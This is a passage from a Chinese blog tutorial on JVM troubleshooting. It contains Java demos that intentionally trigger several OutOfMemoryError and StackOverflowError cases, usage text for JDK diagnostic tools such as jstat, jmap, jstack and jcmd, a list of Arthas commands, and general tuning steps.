class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            str += UUID.randomUUID().toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因：<ul>
<li>可能存在大对象分配。</li>
<li>可能存在内存泄漏。</li>
</ul>
</li>
<li>解决：<ul>
<li>检查是否存在大对象分配，如：大数组。</li>
<li>通过jmap命令记录堆转储文件，使用MAT工具（内存分析）进行分析，检查是否存在内存泄漏等问题。</li>
<li>若没有明显的内存泄露，增大堆内存。</li>
<li>另外，检查是否存在大量的Finalizable对象，可能由框架内部提供，考虑其存在的必要性。</li>
</ul>
</li>
</ul>
<h3 id="2）GC-overhead-limit-exceeded"><a href="#2）GC-overhead-limit-exceeded" class="headerlink" title="2）GC overhead limit exceeded"></a>2）GC overhead limit exceeded</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GcOverheadOOMTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试OOM</span></span><br><span class="line"><span class="comment">     * 配置JVM参数：-Xms6m -Xmx6m -XX:+PrintGCDetails -XX:SurvivorRatio=8</span></span><br><span class="line"><span class="comment">     * 异常信息：java.lang.OutOfMemoryError: GC overhead limit exceeded</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] cache = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>];</span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            list.add(UUID.randomUUID().toString().intern());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因：<ul>
<li>JDK 6新增加的错误类型，一般都是堆太小导致的。超过98%的时间用来做GC并且回收了不到2%的堆内存时会抛出此异常。本质是一个预判性的异常，抛出该异常时系统没有真正的内存溢出。</li>
</ul>
</li>
<li>解决：<ul>
<li>检查是否出现大量的死循环或大内存的代码，优化代码。</li>
<li>添加参数-XX:-UseGCOverheadLimit，禁用这个检查，但不能从根本解决问题，最终都会出现java.lang.OutOfMemoryError: Java heap space。</li>
<li>分析堆转储文件，检查是否存在内存泄漏，若不存在，则增大内存。</li>
</ul>
</li>
</ul>
<h3 id="3）方法区溢出"><a href="#3）方法区溢出" class="headerlink" title="3）方法区溢出"></a>3）方法区溢出</h3><p>以元空间为例，加载过多的类导致OOM：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> com.sun.xml.internal.ws.org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MetaspaceOOMTest</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置JVM参数：-XX:MetaspaceSize=20m -XX:MaxMetaspaceSize=20m</span></span><br><span class="line"><span class="comment">     * 异常信息：java.lang.OutOfMemoryError: Metaspace</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">times</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">MetaspaceOOMTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MetaspaceOOMTest</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">                <span class="type">ClassWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(<span class="number">0</span>);</span><br><span class="line">                writer.visit(Opcodes.V1_6, Opcodes.ACC_PUBLIC, <span class="string">&quot;Class&quot;</span> + i, <span class="literal">null</span>,</span><br><span class="line">                        <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">byte</span>[] code = writer.toByteArray();</span><br><span class="line">                test.defineClass(<span class="string">&quot;Class&quot;</span> + i, code, <span class="number">0</span>, code.length);</span><br><span class="line">                times++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;times = &quot;</span> + times);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因：<ul>
<li>运行期间生产大量代理类，导致方法区被撑爆，无法卸载。</li>
<li>应用长时间运行，没有重启。</li>
<li>元空间设置过小。</li>
</ul>
</li>
<li>解决：<ul>
<li>检查元空间设置是否过小。</li>
<li>检查代码中是否存在大量的反射操作。</li>
<li>使用MAT工具分析堆转储文件，检查是否存在大量由反射生成的代理类。</li>
</ul>
</li>
</ul>
<h3 id="4）栈溢出"><a href="#4）栈溢出" class="headerlink" title="4）栈溢出"></a>4）栈溢出</h3><p>创建过多的线程导致OOM，务必在虚拟机下的系统运行，避免线程过多卡死宿主机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//package com.zhifei;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackOOMTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 务必在虚拟机下的系统运行，避免线程过多卡死宿主机。先javac StackOOMTest.java，再java -Xss1m StackOOMTest，测完kill掉即可。</span></span><br><span class="line"><span class="comment">     * 配置JVM参数：-Xss1m</span></span><br><span class="line"><span class="comment">     * 异常信息：java.lang.OutOfMemoryError: unable to create new native thread</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        testOOM();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testOOM</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    TimeUnit.DAYS.sleep(<span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因：<ul>
<li>创建线程的数量公式：Number of threads &#x3D; (MaxProcessMemory - JVMMemory - ReservedOsMemory) &#x2F; ThreadStackSize 。<ul>
<li>MaxProcessMemory：进程可寻址的最大空间（32位操作系统为2的32次方，64位为2的64次方）。</li>
<li>JVMMemory：JVM内存。</li>
<li>ReservedOsMemory：保留的操作系统内存。</li>
<li>ThreadStackSize：线程栈的大小。</li>
</ul>
</li>
</ul>
</li>
<li>解决：<ul>
<li>检查是否存在大量不需要的线程。</li>
<li>若需要大量的线程，可通过修改MaxProcessMemory，JVMMemory，ThreadStackSize这三个因素，来增加可创建的线程数。<ul>
<li>使用64位操作系统。</li>
<li>缩小JVM内存分配。</li>
<li>缩小线程栈内存分配。</li>
</ul>
</li>
<li>检查操作系统级别的限制：<ul>
<li>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;pid_max，系统最大pid值。</li>
<li>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;threads-max，系统最大线程数。</li>
<li>maxuserprocess（ulimit -u），系统最大用户进程数。</li>
<li>&#x2F;proc&#x2F;sys&#x2F;vm&#x2F;max_map_count，限制一个进程拥有的VMA（虚拟内存区域）数量。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>另外，栈的SOF示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StackSOFTest</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置JVM参数：-Xss1m</span></span><br><span class="line"><span class="comment">     * 异常信息：java.lang.StackOverflowError</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        testSOF();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testSOF</span><span class="params">()</span> &#123;</span><br><span class="line">        testSOF();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>原因：<ul>
<li>方法调用链过长，如：无限递归调用。</li>
</ul>
</li>
</ul>
<h2 id="7-2-命令行工具"><a href="#7-2-命令行工具" class="headerlink" title="7.2 命令行工具"></a>7.2 命令行工具</h2><h3 id="1）jps"><a href="#1）jps" class="headerlink" title="1）jps"></a>1）jps</h3><p>查看Java进程状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usage: jps [-help]</span><br><span class="line">       jps [-q] [-mlvV] [&lt;hostid&gt;]</span><br><span class="line">Definitions:</span><br><span class="line">    &lt;hostid&gt;:      &lt;hostname&gt;[:&lt;port&gt;]</span><br><span class="line">具体说明：</span><br><span class="line">-q	只显示进程id</span><br><span class="line">-l	输出进程id和进程主类全类名</span><br><span class="line">-m	输出虚拟机进程启动时传递给主类main方法的参数</span><br><span class="line">-v	列出虚拟机进程启动时的jvm参数</span><br><span class="line"></span><br><span class="line">如果某Java进程关闭了默认开启的UsePerfData参数(即使用参数-XX:-UsePerfData) ，那么jps命令(以及jstat)将无法探知该Java进程。</span><br><span class="line">可以通过&lt;hostname&gt;[:&lt;port&gt;]查看远程的主机的java进程，需要搭配jstatd使用，但是不安全，建议本地使用。</span><br></pre></td></tr></table></figure>

<h3 id="2）jstat"><a href="#2）jstat" class="headerlink" title="2）jstat"></a>2）jstat</h3><p>查看JVM统计信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: jstat -help|-options</span><br><span class="line">       jstat -&lt;option&gt; [-t] [-h&lt;lines&gt;] &lt;vmid&gt; [&lt;interval&gt; [&lt;count&gt;]]</span><br><span class="line">示例：jstat -gc -h5 12924 1000 10  输出进程id为12924的统计信息，隔5条输出一个表头，隔1s输出一次，共输出10次。</span><br><span class="line"></span><br><span class="line">Definitions:</span><br><span class="line">  &lt;option&gt;      An option reported by the -options option（可选参数）</span><br><span class="line">  -t			timestamp.（显示程序运行的总时长）</span><br><span class="line">  &lt;vmid&gt;        Virtual Machine Identifier. A vmid takes the following form:</span><br><span class="line">                     &lt;lvmid&gt;[@&lt;hostname&gt;[:&lt;port&gt;]]</span><br><span class="line">                Where &lt;lvmid&gt; is the local vm identifier for the target</span><br><span class="line">                Java virtual machine, typically a process id; &lt;hostname&gt; is</span><br><span class="line">                the name of the host running the target Java virtual machine;</span><br><span class="line">                and &lt;port&gt; is the port number for the rmiregistry on the</span><br><span class="line">                target host. See the jvmstat documentation for a more complete</span><br><span class="line">                description of the Virtual Machine Identifier.（java进程id）   </span><br><span class="line">  &lt;lines&gt;       Number of samples between header lines.(隔多少行输出一次表头信息)</span><br><span class="line">  &lt;interval&gt;    Sampling interval. The following forms are allowed:</span><br><span class="line">                    &lt;n&gt;[&quot;ms&quot;|&quot;s&quot;]</span><br><span class="line">                Where &lt;n&gt; is an integer and the suffix specifies the units as</span><br><span class="line">                milliseconds(&quot;ms&quot;) or seconds(&quot;s&quot;). The default units are &quot;ms&quot;.（隔多长时间输出一次，默认单位ms，可选单位：ms/s）</span><br><span class="line">  &lt;count&gt;       Number of samples to take before terminating.（输出多少次）</span><br><span class="line">  -J&lt;flag&gt;      Pass &lt;flag&gt; directly to the runtime system.</span><br><span class="line"></span><br><span class="line">具体&lt;option&gt;：</span><br><span class="line">1）类装载相关</span><br><span class="line">-class:显示ClassLoader的相关信息: 类的装载、卸载数量、总空间、类装载所消耗的时间等</span><br><span class="line"></span><br><span class="line">2）垃圾回收相关</span><br><span class="line">-gc:显示与GC相关的堆信息。</span><br><span class="line">-gccapacity:显示内容与-gc基本相同，但输出主要关注Java堆各个区域使用到的最大、最小空间。</span><br><span class="line">-gcutil:显示内容与-gc基本相同，但输出主要关注已使用空间占总空间的百分比。</span><br><span class="line">-gccause:与-gcutil功能一样，但是会额外输出导致最后一次或当前正在发生的GC产生的原因。</span><br><span class="line">-gcnew:显示新生代GC状况。</span><br><span class="line">-gcnewcapacity:显示内容与-gcnew基本相同，输出主要关注使用到的最大、最小空间。</span><br><span class="line">-gcold:显示老年代GC状况。</span><br><span class="line">-gcoldcapacity:显示内容与-gcold基本相同，输出主要关注使用到的最大、最小空间。</span><br><span class="line">-gcpermcapacity（或-gcmetacapacity）:显示永久代（或元空间）使用到的最大、最小空间。</span><br><span class="line">结果表头含义：</span><br><span class="line">S0C:S0大小（字节）；S1C:S1大小（字节）；S0U:S0已使用大小（字节）；S1U:S1已使用大小（字节）；</span><br><span class="line">EC:Eden大小（字节）；EU:Eden已使用大小（字节）；OC:老年代大小（字节）OU:老年代已使用大小（字节）；</span><br><span class="line">MC:方法区大小（字节）；MU:方法区已使用大小（字节）；CCSC:压缩类空间大小（字节）；CCSU:压缩类空间已使用大小（字节）；</span><br><span class="line">YGC:Young GC次数；YGCT:Young GC消耗的时间（秒）；FGC:Full GC次数；FGCT:Full GC消耗的时间（秒）；GCT:GC的总时间。</span><br><span class="line"></span><br><span class="line">3）JIT相关</span><br><span class="line">-compiler:显示JIT编 译器编译过的方法、耗时等信息</span><br><span class="line">-printcompilation:输出已经被JIT编译的方法</span><br></pre></td></tr></table></figure>

<h3 id="3）jinfo"><a href="#3）jinfo" class="headerlink" title="3）jinfo"></a>3）jinfo</h3><p>实时查看和修改JVM配置参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">    jinfo [option] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jinfo [option] &lt;executable &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jinfo [option] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to remote debug server)</span><br><span class="line">where &lt;option&gt; is one of:</span><br><span class="line">    -flag &lt;name&gt;         to print the value of the named VM flag</span><br><span class="line">    -flag [+|-]&lt;name&gt;    to enable or disable the named VM flag</span><br><span class="line">    -flag &lt;name&gt;=&lt;value&gt; to set the named VM flag to the given value</span><br><span class="line">    -flags               to print VM flags</span><br><span class="line">    -sysprops            to print Java system properties</span><br><span class="line">    &lt;no option&gt;          to print both of the above</span><br><span class="line">    -h | -help           to print this help message</span><br><span class="line">示例：jinfo -flag ConcGCThreads 1321  查看进程1321的ConcGCThreads参数值。</span><br><span class="line">    </span><br><span class="line">java -XX:+PrintFlagsInitial			查看参数初始值</span><br><span class="line">java -XX:+PrintFlagsFinal			查看参数最终值</span><br><span class="line">java -XX:+PrintCommandLineFlags		查看被修改过的参数</span><br><span class="line">java -XX:+PrintFlagsFinal -version | grep manageable	&#123;manageable&#125;标记的参数是可被实时修改的</span><br></pre></td></tr></table></figure>

<h3 id="4）jmap"><a href="#4）jmap" class="headerlink" title="4）jmap"></a>4）jmap</h3><p>导出内存映像文件和内存使用情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">    jmap [option] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jmap [option] &lt;executable &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jmap [option] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to remote debug server)</span><br><span class="line">where &lt;option&gt; is one of:</span><br><span class="line">    &lt;none&gt;               to print same info as Solaris pmap</span><br><span class="line">    -heap                to print java heap summary</span><br><span class="line">    -histo[:live]        to print histogram of java object heap; if the &quot;live&quot;</span><br><span class="line">                         suboption is specified, only count live objects</span><br><span class="line">    -clstats             to print class loader statistics</span><br><span class="line">    -finalizerinfo       to print information on objects awaiting finalization</span><br><span class="line">    -dump:&lt;dump-options&gt; to dump java heap in hprof binary format</span><br><span class="line">                         dump-options:</span><br><span class="line">                           live         dump only live objects; if not specified,</span><br><span class="line">                                        all objects in the heap are dumped.</span><br><span class="line">                           format=b     binary format</span><br><span class="line">                           file=&lt;file&gt;  dump heap to &lt;file&gt;</span><br><span class="line">                         Example: jmap -dump:live,format=b,file=heap.bin &lt;pid&gt;</span><br><span class="line">    -F                   force. Use with -dump:&lt;dump-options&gt; &lt;pid&gt; or -histo</span><br><span class="line">                         to force a heap dump or histogram when &lt;pid&gt; does not</span><br><span class="line">                         respond. The &quot;live&quot; suboption is not supported</span><br><span class="line">                         in this mode.</span><br><span class="line">    -h | -help           to print this help message</span><br><span class="line">    -J&lt;flag&gt;             to pass &lt;flag&gt; directly to the runtime system</span><br><span class="line">示例：</span><br><span class="line">jmap -dump:[live,]format=b,file=&lt;filename.hprof&gt; &lt;pid&gt;	手动导出堆内存信息，加live表示只dump出存活的对象。</span><br><span class="line">-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=&lt;filename.hprof&gt;	添加这两个参数，在OOM的时会导出内存信息。</span><br></pre></td></tr></table></figure>

<h3 id="5）jhat"><a href="#5）jhat" class="headerlink" title="5）jhat"></a><del>5）jhat</del></h3><p>JDK自带堆分析工具，JDK 9、JDK10中已经删除，官方建议使用VisualVM代替：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:  jhat [-stack &lt;bool&gt;] [-refs &lt;bool&gt;] [-port &lt;port&gt;] [-baseline &lt;file&gt;] [-debug &lt;int&gt;] [-version] [-h|-help] &lt;file&gt;</span><br><span class="line"></span><br><span class="line">        -J&lt;flag&gt;          Pass &lt;flag&gt; directly to the runtime system. For</span><br><span class="line">                          example, -J-mx512m to use a maximum heap size of 512MB</span><br><span class="line">        -stack false:     Turn off tracking object allocation call stack.</span><br><span class="line">        -refs false:      Turn off tracking of references to objects</span><br><span class="line">        -port &lt;port&gt;:     Set the port for the HTTP server.  Defaults to 7000</span><br><span class="line">        -exclude &lt;file&gt;:  Specify a file that lists data members that should</span><br><span class="line">                          be excluded from the reachableFrom query.</span><br><span class="line">        -baseline &lt;file&gt;: Specify a baseline object dump.  Objects in</span><br><span class="line">                          both heap dumps with the same ID and same class will</span><br><span class="line">                          be marked as not being &quot;new&quot;.</span><br><span class="line">        -debug &lt;int&gt;:     Set debug level.</span><br><span class="line">                            0:  No debug output</span><br><span class="line">                            1:  Debug hprof file parsing</span><br><span class="line">                            2:  Debug hprof file parsing, no server</span><br><span class="line">        -version          Report version number</span><br><span class="line">        -h|-help          Print this help and exit</span><br><span class="line">        &lt;file&gt;            The file to read</span><br><span class="line"></span><br><span class="line">For a dump file that contains multiple heap dumps,</span><br><span class="line">you may specify which dump in the file</span><br><span class="line">by appending &quot;#&lt;number&gt;&quot; to the file name, i.e. &quot;foo.hprof#3&quot;.</span><br><span class="line"></span><br><span class="line">All boolean options default to &quot;true&quot;</span><br></pre></td></tr></table></figure>

<h3 id="6）jstack"><a href="#6）jstack" class="headerlink" title="6）jstack"></a>6）jstack</h3><p>打印JVM中线程快照：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">    jstack [-l] &lt;pid&gt;</span><br><span class="line">        (to connect to running process)</span><br><span class="line">    jstack -F [-m] [-l] &lt;pid&gt;</span><br><span class="line">        (to connect to a hung process)</span><br><span class="line">    jstack [-m] [-l] &lt;executable&gt; &lt;core&gt;</span><br><span class="line">        (to connect to a core file)</span><br><span class="line">    jstack [-m] [-l] [server_id@]&lt;remote server IP or hostname&gt;</span><br><span class="line">        (to connect to a remote debug server)</span><br><span class="line">Options:</span><br><span class="line">    -F  to force a thread dump. Use when jstack &lt;pid&gt; does not respond (process is hung)</span><br><span class="line">    -m  to print both java and native frames (mixed mode)</span><br><span class="line">    -l  long listing. Prints additional information about locks</span><br><span class="line">    -h or -help to print this help message</span><br><span class="line">示例：jstack 1321 &gt; stack.log</span><br><span class="line"></span><br><span class="line">信息中重点关注的关键字：</span><br><span class="line">- Deadlock：死锁</span><br><span class="line">- Waiting on condition：等待资源</span><br><span class="line">- Waiting on monitor entry：等待获取监视器</span><br><span class="line">- Blocked：阻塞</span><br><span class="line">- Runnable：执行中</span><br><span class="line">- Suspended：暂停</span><br></pre></td></tr></table></figure>

<h3 id="7）jcmd"><a href="#7）jcmd" class="headerlink" title="7）jcmd"></a>7）jcmd</h3><p>多功能命令，JDK 7新增，实现了除jstat外所有命令的功能，拥有jmap的大部分功能，官方推荐使用jcmd代替jmap：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: jcmd &lt;pid | main class&gt; &lt;command ...|PerfCounter.print|-f file&gt;</span><br><span class="line">   or: jcmd -l</span><br><span class="line">   or: jcmd -h</span><br><span class="line">  command must be a valid jcmd command for the selected jvm.</span><br><span class="line">  Use the command &quot;help&quot; to see which commands are available.</span><br><span class="line">  If the pid is 0, commands will be sent to all Java processes.</span><br><span class="line">  The main class argument will be used to match (either partially</span><br><span class="line">  or fully) the class used to start Java.</span><br><span class="line">  If no options are given, lists Java processes (same as -p).</span><br><span class="line">  PerfCounter.print display the counters exposed by this process</span><br><span class="line">  -f  read and execute commands from the file（从文件读取执行命令）</span><br><span class="line">  -l  list JVM processes on the local machine（列出本地所有JVM进程）</span><br><span class="line">  -h  this help</span><br><span class="line">示例：</span><br><span class="line">jcmd &lt;pid&gt; help	针对指定进程，列出支持的所有命令。</span><br><span class="line">jcmd &lt;pid&gt; &lt;具体命令&gt;	显示指定进程的指令命令数据。</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line">jcmd &lt;pid&gt; GC.heap_dump dump.hprof</span><br><span class="line">等价于</span><br><span class="line">jmap -dump:live,format=b,file=dump.hprof &lt;pid&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#####################################</span></span></span><br><span class="line">jcmd &lt;pid&gt; GC.heap_dump -all dump.hprof</span><br><span class="line">等价于</span><br><span class="line">jmap -dump:format=b,file=dump.hprof &lt;pid&gt;</span><br></pre></td></tr></table></figure>

<h3 id="8）jstatd"><a href="#8）jstatd" class="headerlink" title="8）jstatd"></a>8）jstatd</h3><p>远程主机信息收集：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usage: jstatd [-nr] [-p port] [-n rminame]</span><br></pre></td></tr></table></figure>

<h2 id="7-3-GUI工具"><a href="#7-3-GUI工具" class="headerlink" title="7.3 GUI工具"></a>7.3 GUI工具</h2><p>有jConsole (JDK)、Visual VM (JDK，推荐安装VisualGC插件)、eclipse MAT、JProfiler、Arthas、Java Mission Control (JDK)等工具，这里详细介绍Arthas：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1）基础命令</span><br><span class="line">help 查看命令帮助信息，查看出来的命令的具体用法可以通过，&lt;具体命令&gt; -h查看具体用法</span><br><span class="line">cat 打印文件内容，和linux里的cat命令类似</span><br><span class="line">echo 打印参数，和linux里的echo命令类似</span><br><span class="line">grep 匹配查找，和linux里的grep命令类似</span><br><span class="line">base64 base64编码转换，和linux里的base64命令类似</span><br><span class="line">tee 复制标准输入到标准输出和指定的文件，和linux里的tee命令类似</span><br><span class="line">pwd 返回当前的工作目录，和linux命令类似</span><br><span class="line">cls 清空当前屏幕区域</span><br><span class="line">session 查看当前会话的信息</span><br><span class="line">reset 重置增强类，将被Arthas增强过的类全部还原，Arthas服务端关闭时会重置所有增强过的类</span><br><span class="line">version 输出当前目标Java进程所加载的Arthas版本号</span><br><span class="line">history 打印命令历史</span><br><span class="line">quit 退出当前Arthas客户端，其他Arthas客户端不受影响</span><br><span class="line">stop 关闭Arthas服务端，所有Arthas客户端全部退出</span><br><span class="line">keymap Arthas快捷键列表及自定义快捷键</span><br><span class="line"></span><br><span class="line">2）JVM相关</span><br><span class="line">dashboard 当前系统的实时数据面板</span><br><span class="line">thread 查看当前JVM的线程堆栈信息</span><br><span class="line">jvm 查看当前JVM的信息</span><br><span class="line">sysprop 查看和修改JVM的系统属性</span><br><span class="line">sysenv 查看JVM的环境变量</span><br><span class="line">vmoption 查看和修改JVM里诊断相关的option</span><br><span class="line">perfcounter 查看当前JVM的Perf Counter信息</span><br><span class="line">logger 查看和修改logger</span><br><span class="line">getstatic 查看类的静态属性</span><br><span class="line">ognl 执行ognl表达式</span><br><span class="line">mbean 查看Mbean的信息</span><br><span class="line">heapdump dump java heap, 类似jmap命令的heap dump功能</span><br><span class="line"></span><br><span class="line">3）class/classloader相关</span><br><span class="line">sc 查看JVM已加载的类信息</span><br><span class="line">sm 查看已加载类的方法信息</span><br><span class="line">jad 反编译指定已加载类的源码</span><br><span class="line">mc 内存编译器，内存编译.java文件为.class文件</span><br><span class="line">retransform 加载外部的.class文件，retransform到JVM里</span><br><span class="line">redefine 加载外部的.class文件，redefine到JVM里</span><br><span class="line">dump dump已加载类的byte code到特定目录</span><br><span class="line">classloader 查看classloader的继承树，urls，类加载信息，使用classloader去getResource</span><br><span class="line"></span><br><span class="line">4）monitor/watch/trace相关</span><br><span class="line">monitor 方法执行监控</span><br><span class="line">watch 方法执行数据观测</span><br><span class="line">trace 方法内部调用路径，并输出方法路径上的每个节点上耗时</span><br><span class="line">stack 输出当前方法被调用的调用路径</span><br><span class="line">tt 方法执行数据的时空隧道，记录下指定方法每次调用的入参和返回信息，并能对这些不同的时间下调用进行观测</span><br><span class="line">注意：这些命令通过字节码增强技术来实现，在指定类的方法中插入一些切面来实现数据统计和观测，因此在线上、预发使用时，尽量明确需要观测的类、方法以及条件，诊断结束要执行stop或将增强过的类执行reset命令。</span><br><span class="line"></span><br><span class="line">5）火焰图</span><br><span class="line">profiler 使用async-profiler对应用采样，生成火焰图</span><br><span class="line"></span><br><span class="line">6）鉴权</span><br><span class="line">auth 鉴权</span><br><span class="line"></span><br><span class="line">7）options</span><br><span class="line">options 查看或设置Arthas全局开关</span><br><span class="line"></span><br><span class="line">8）管道命令|</span><br><span class="line">示例：sm java.lang.String * | grep &#x27;index&#x27;</span><br><span class="line">grep 搜索满足条件的结果</span><br><span class="line">plaintext 将命令的结果去除ANSI颜色</span><br><span class="line">wc 按行统计输出结果</span><br><span class="line"></span><br><span class="line">9）后台异步任务，详情请参考https://arthas.gitee.io/async.html</span><br><span class="line">使用 &gt; 将结果重写向到日志文件，使用 &amp; 指定命令是后台运行，session断开不影响任务执行（生命周期默认为1天）</span><br><span class="line">jobs 列出所有job</span><br><span class="line">kill 强制终止任务</span><br><span class="line">fg 将暂停的任务拉到前台执行</span><br><span class="line">bg 将暂停的任务放到后台执行</span><br></pre></td></tr></table></figure>

<h1 id="8-优化案例"><a href="#8-优化案例" class="headerlink" title="8. 优化案例"></a>8. 优化案例</h1><p>通用步骤：</p>
<ul>
<li>监控<ul>
<li>GC频繁</li>
<li>CPU 负载过高</li>
<li>OOM</li>
<li>内存泄漏</li>
<li>死锁</li>
<li>程序响应时间过长</li>
</ul>
</li>
<li>分析<ul>
<li>打印并分析GC日志</li>
<li>灵活运用命令行工具jstack、jmap、jinfo等</li>
<li>转存堆转储文件，使用内存分析工具进行分析</li>
<li>使用Arthas、jconsole、JvisualVM等实时查看JVM状态</li>
</ul>
</li>
<li>优化<ul>
<li>适当增加内存、机器数量</li>
<li>根据业务场景选择垃圾收集器</li>
<li>优化代码，控制内存的使用</li>
<li>合理设置线程池的线程数</li>
<li>使用中间件提高程序效率，比如：缓存、消息队列等</li>
</ul>
</li>
</ul>
